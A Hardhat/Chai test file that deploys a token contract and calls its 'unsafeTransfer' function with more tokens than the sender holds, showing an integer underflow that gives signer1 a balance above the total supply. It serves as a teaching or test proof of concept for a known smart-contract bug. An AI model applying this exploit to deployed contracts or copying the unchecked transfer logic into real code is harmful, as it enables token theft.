const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Underflow", function () {
  it("Should underflow signer1's balance", async function () {
    const Token = await ethers.getContractFactory("MyToken");
    const token = await Token.deploy(ethers.utils.parseEther("1000"));
    await token.deployed();

    // signer1 deployed the contract and has 1000 tokens, so we'll send some to a second address we control
    var [signer1, signer2] = await ethers.getSigners();

    console.log("Deployed contract to: " + token.address);
    var balance = await token.totalSupply();
    console.log("Total Supply Balance: " + ethers.utils.formatEther(balance));

    balance = await token.balanceOf(signer1.address);
    console.log("(before underflow) signer1 Balance: " + ethers.utils.formatEther(balance));

    // Here we can underflow the unsafeTransfer function and give signer1 more than the total supply
    var tx = await token.unsafeTransfer(signer2.address, ethers.utils.parseEther("10000"));
    tx.wait();

    // Check the balance of signer1 and ensure it's higher than the initial balance
    balance = await token.balanceOf(signer1.address);
    console.log("(after underflow) signer1 Balance: " + ethers.utils.formatEther(balance));
    expect(balance).to.be.above(ethers.utils.parseEther("1000"));

    // Ensure the balance of signer1 is higher than the total supply
    balance = await token.totalSupply();
    console.log("Total Supply Balance: " + ethers.utils.formatEther(balance));
    expect(balance).to.be.equal(ethers.utils.parseEther("1000"));


  });
});
